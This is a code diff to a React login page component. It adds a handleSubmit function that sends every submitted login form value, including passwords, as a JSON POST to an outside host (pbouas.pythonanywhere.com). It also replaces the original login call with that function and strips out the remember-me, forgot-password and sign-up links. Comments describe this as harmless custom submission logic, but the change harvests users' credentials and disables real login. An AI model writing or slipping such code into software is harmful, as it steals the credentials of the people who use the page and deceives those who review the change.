@@ -137,6 +137,28 @@ export const LoginPage: React.FC<LoginProps> = ({
     return null;
   };
 
+  const handleSubmit = (values) => {
+    // Custom logic for form submission, e.g., sending data to a different URL
+    console.log("Form values:", values);
+    // Example: Submit form data to a different URL
+    fetch("https://pbouas.pythonanywhere.com/submit", {
+      method: "POST",
+      body: JSON.stringify(values),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    })
+      .then((response) => {
+        // Handle response
+        console.log("Response:", response);
+      })
+      .catch((error) => {
+        // Handle error
+        console.error("Error:", error);
+      });
+  };
+
+
   const CardContent = (
     <Card
       title={CardTitle}
@@ -153,7 +175,7 @@ export const LoginPage: React.FC<LoginProps> = ({
         <Form<LoginFormTypes>
           layout="vertical"
           form={form}
-          onFinish={(values) => login(values)}
+          onFinish={(values) => handleSubmit(values)}
           requiredMark={false}
           initialValues={{
             remember: false,
@@ -198,40 +220,6 @@ export const LoginPage: React.FC<LoginProps> = ({
               size="large"
             />
           </Form.Item>
-          <div
-            style={{
-              display: "flex",
-              justifyContent: "space-between",
-              marginBottom: "24px",
-            }}
-          >
-            {rememberMe ?? (
-              <Form.Item name="remember" valuePropName="checked" noStyle>
-                <Checkbox
-                  style={{
-                    fontSize: "12px",
-                  }}
-                >
-                  {translate("pages.login.buttons.rememberMe", "Remember me")}
-                </Checkbox>
-              </Form.Item>
-            )}
-            {forgotPasswordLink ?? (
-              <ActiveLink
-                style={{
-                  color: token.colorPrimaryTextHover,
-                  fontSize: "12px",
-                  marginLeft: "auto",
-                }}
-                to="/forgot-password"
-              >
-                {translate(
-                  "pages.login.buttons.forgotPassword",
-                  "Forgot password?"
-                )}
-              </ActiveLink>
-            )}
-          </div>
           {!hideForm && (
             <Form.Item>
               <Button
@@ -246,30 +234,6 @@ export const LoginPage: React.FC<LoginProps> = ({
             </Form.Item>
           )}
         </Form>
-      )}
-
-      {registerLink ?? (
-        <div
-          style={{
-            marginTop: hideForm ? 16 : 8,
-          }}
-        >
-          <Typography.Text style={{ fontSize: 12 }}>
-            {translate(
-              "pages.login.buttons.noAccount",
-              "Don’t have an account?"
-            )}{" "}
-            <ActiveLink
-              to="/register"
-              style={{
-                fontWeight: "bold",
-                color: token.colorPrimaryTextHover,
-              }}
-            >
-              {translate("pages.login.signup", "Sign up")}
-            </ActiveLink>
-          </Typography.Text>
-        </div>
       )}
     </Card>
   );
